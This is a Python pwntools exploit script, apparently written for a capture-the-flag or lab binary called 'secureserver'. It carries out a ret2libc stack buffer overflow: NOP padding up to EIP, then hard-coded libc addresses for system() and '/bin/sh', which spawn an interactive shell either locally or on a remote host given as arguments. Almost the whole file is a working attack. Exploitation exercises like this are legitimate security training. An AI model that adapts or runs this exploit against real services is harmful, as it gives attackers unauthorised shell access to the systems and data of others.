from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

context.terminal = ["tmux", "splitw", "-l", "80%", "-t", ":.1"]
context.log_level = 'debug'

# Specify GDB script here (breakpoints etc)
gdbscript = '''
# init-pwndbg
# b *0x080491dc
# continue
b *receive_feedback + 56
'''.format(**locals())


# Binary filename
exe = './secureserver'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
# context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Lib-c offsets, found manually (ASLR_OFF)
# ➜  (venv)  32-bit  (master ✘)ldd secureserver
#         linux-gate.so.1 (0xf7fc4000)
#         libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d6b000)
#         /lib/ld-linux.so.2 (0xf7fc6000)
libc_base = 0xf7d6b000

# readelf -s /lib/i386-linux-gnu/libc.so.6  | grep system
# OR
# pwndbg> x system
# 0xf7db3150 <__libc_system>:     0xfb1e0ff3
system = libc_base + 0x48150

# strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "bin/sh"
# OR
# pwndbg> search '/bin/sh'
# libc.so.6       0xf7f280f5 '/bin/sh'
binsh = libc_base + 0x1bd0f5

info("system %#x", system)
info("binsh  %#x", binsh)

# How many bytes to the instruction pointer (EIP)?
padding = 76

payload = flat(
    asm('nop') * padding,  # Padding up to EIP
    system,  # Address of system function in libc
    0x0,  # Return pointer
    binsh  # Address of /bin/sh in libc
)

# Write payload to file
write('payload', payload)

# Exploit
io.sendlineafter(b':', payload)

# Get flag/shell
io.interactive()
